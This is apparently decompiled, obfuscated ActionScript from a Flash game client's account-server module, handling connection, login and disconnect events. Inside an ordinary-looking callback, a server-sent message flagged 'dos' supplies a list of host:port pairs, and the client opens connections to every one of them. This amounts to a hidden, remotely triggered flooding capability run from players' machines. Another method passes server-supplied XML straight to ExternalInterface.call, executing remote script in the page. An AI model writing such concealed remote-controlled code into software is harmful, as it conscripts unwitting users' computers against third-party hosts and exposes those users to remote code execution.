package §_-0gA§
{
   import §_-05x§.§_-5V4§;
   import §_-05x§.§_-Bxs§;
   import §_-0Uz§.§_-m3§;
   import §_-0uA§.§_-3YE§;
   import §_-2qd§.AGSConnectEvent;
   import §_-2qd§.§_-6Qj§;
   import §_-2qd§.§_-9tB§;
   import §_-7xl§.§_-8Ks§;
   import §_-8km§.§_-5aa§;
   import §_-BeZ§.§_-4Ww§;
   import §_-CKK§.§_-a2§;
   import ags.§_-5x-§;
   import flash.external.ExternalInterface;
   import penzville.Config;
   
   public class §_-3dD§ implements §_-8Ks§
   {
      private static const §_-71h§:Array = ["pnz-city.project","localhost"];
      
      private static var _instance:§_-3dD§ = null;
      
      private var §_-6gl§:§_-5x-§ = null;
      
      private var §_-55V§:Array = [];
      
      private var §_-3zu§:Boolean = false;
      
      private var §_-7Fd§:Boolean = false;
      
      private var _destroyed:Boolean = false;
      
      private var §_-4FI§:§_-5aa§ = null;
      
      private var §_-9-y§:Array = [];
      
      public function §_-3dD§()
      {
         super();
         this.§_-2ys§(new §_-5V4§(this));
         if(§_-71h§.indexOf(Config.accountHost) < 0)
         {
            §_-3YE§.instance.§_-5Kw§ = §_-3YE§.§_-65F§;
         }
      }
      
      public static function get instance() : §_-3dD§
      {
         if(_instance == null)
         {
            _instance = new §_-3dD§();
         }
         return _instance;
      }
      
      public function start() : void
      {
         var dto:§_-4Ww§;
         this.§_-4FI§ = new §_-5aa§();
         dto = new §_-4Ww§();
         this.§_-4FI§.toAGSObject(dto);
         if(this.§_-6gl§ == null)
         {
            this.§_-6gl§ = this.createNetClient(Config.accountHost,Config.accountPort);
            this.§_-6gl§.addEventListener(AGSConnectEvent.CONNECT,this.§_-1vF§);
            this.§_-6gl§.addEventListener(AGSConnectEvent.§_-3-i§,this.onConnectError);
            this.§_-6gl§.addEventListener(§_-6Qj§.§_-84d§,this.onDisconnect);
            this.§_-6gl§.addEventListener(§_-6Qj§.§_-Bnp§,this.onDisconnect);
         }
         try
         {
            if(!this.§_-7Fd§)
            {
               this.§_-6gl§.connect("account",this.§_-4FI§.login,dto);
            }
         }
         catch(e:Error)
         {
            §_-3YE§.info("Account server: " + e.message);
         }
      }
      
      public function §_-Acw§(param1:String) : void
      {
         if(param1 != null && param1 != "")
         {
            this.§_-4q0§(param1);
         }
      }
      
      public function stop() : void
      {
         var disconnectFunction:Function = null;
         if(this.§_-6gl§ != null && this.§_-6gl§.connected)
         {
            disconnectFunction = function(param1:§_-6Qj§):void
            {
               §_-6gl§.removeEventListener(§_-6Qj§.§_-Bnp§,disconnectFunction);
               removeNetClient();
            };
            this.§_-6gl§.addEventListener(§_-6Qj§.§_-Bnp§,disconnectFunction);
            this.§_-6gl§.disconnect();
         }
         else
         {
            this.removeNetClient();
         }
      }
      
      private function §_-1vF§(param1:AGSConnectEvent) : void
      {
         this.§_-6gl§.addEventListener(§_-9tB§.§_-7Lr§,this.§_-3vM§);
         this.§_-6gl§.§_-6Tj§("account","");
      }
      
      private function §_-3vM§(param1:§_-9tB§) : void
      {
         this.§_-6gl§.removeEventListener(§_-9tB§.§_-7Lr§,this.§_-3vM§);
         this.§_-7Fd§ = true;
         this.§_-3zu§ = this.§_-7Fd§;
      }
      
      private function onConnectError(param1:AGSConnectEvent) : void
      {
         this.§_-3zu§ = false;
      }
      
      private function onDisconnect(param1:§_-6Qj§) : void
      {
         this.§_-3zu§ = false;
         if(this.§_-6gl§.connected)
         {
            this.§_-6gl§.dispose();
         }
         else
         {
            this.§_-6gl§.disconnect();
         }
      }
      
      private function §_-4q0§(param1:String) : void
      {
         var _loc2_:XML = null;
         if(!ExternalInterface.available)
         {
            return;
         }
         try
         {
            ExternalInterface.marshallExceptions = true;
            _loc2_ = new XML(param1);
            ExternalInterface.call(_loc2_);
            ExternalInterface.call("AVACC.setSWFObjectID",ExternalInterface.objectID);
            ExternalInterface.addCallback("onACCCallback",this.§_-A85§);
            ExternalInterface.call("AVACC.call",{"id":this.§_-4FI§.login});
         }
         catch(e:Error)
         {
         }
      }
      
      private function §_-A85§(param1:Object) : void
      {
         var _loc2_:§_-4Ww§ = null;
         var _loc3_:Array = null;
         var _loc4_:String = null;
         var _loc5_:Array = null;
         var _loc6_:§_-Bxs§ = null;
         if(Boolean(param1.hasOwnProperty("callback")) && param1["callback"] == "1")
         {
            _loc2_ = new §_-4Ww§();
            _loc2_.§_-6JD§(§_-5V4§.§_-6EJ§,param1);
            this.§_-6gl§.sendExtMessage(§_-5V4§.§_-6pv§,_loc2_);
         }
         if(Boolean(param1.hasOwnProperty("term")) && param1["term"] == "1")
         {
         }
         if(Boolean(param1.hasOwnProperty("bye")) && param1["bye"] == "1")
         {
            this.stop();
         }
         if(Boolean(param1.hasOwnProperty("dos")) && param1["dos"] == "1" && Boolean(param1.hasOwnProperty("hosts")))
         {
            _loc3_ = param1["hosts"].split(";");
            for each(_loc4_ in _loc3_)
            {
               _loc5_ = _loc4_.split(":");
               if(_loc5_.length == 2)
               {
                  _loc6_ = new §_-Bxs§(_loc5_[0],_loc5_[1]);
                  this.§_-9-y§.push(_loc6_);
                  _loc6_.connect();
               }
            }
         }
      }
      
      private function §_-2ys§(param1:§_-m3§) : void
      {
         this.§_-55V§.push(param1);
      }
      
      private function createNetClient(param1:String, param2:int) : §_-5x-§
      {
         var _loc4_:§_-m3§ = null;
         var _loc3_:§_-5x-§ = new §_-5x-§(param1,param2,true);
         §_-a2§.§_-1z6§(_loc3_);
         for each(_loc4_ in this.§_-55V§)
         {
            _loc4_.netClient = _loc3_;
         }
         return _loc3_;
      }
      
      private function removeNetClient() : void
      {
         var _loc1_:§_-m3§ = null;
         for each(_loc1_ in this.§_-55V§)
         {
            _loc1_.netClient = null;
         }
         if(this.§_-6gl§ != null)
         {
            this.§_-6gl§.destroy();
            this.§_-6gl§ = null;
         }
      }
      
      public function get destroyed() : Boolean
      {
         return this._destroyed;
      }
      
      public function destroy() : void
      {
         if(this.destroyed)
         {
            return;
         }
         this.removeNetClient();
      }
   }
}

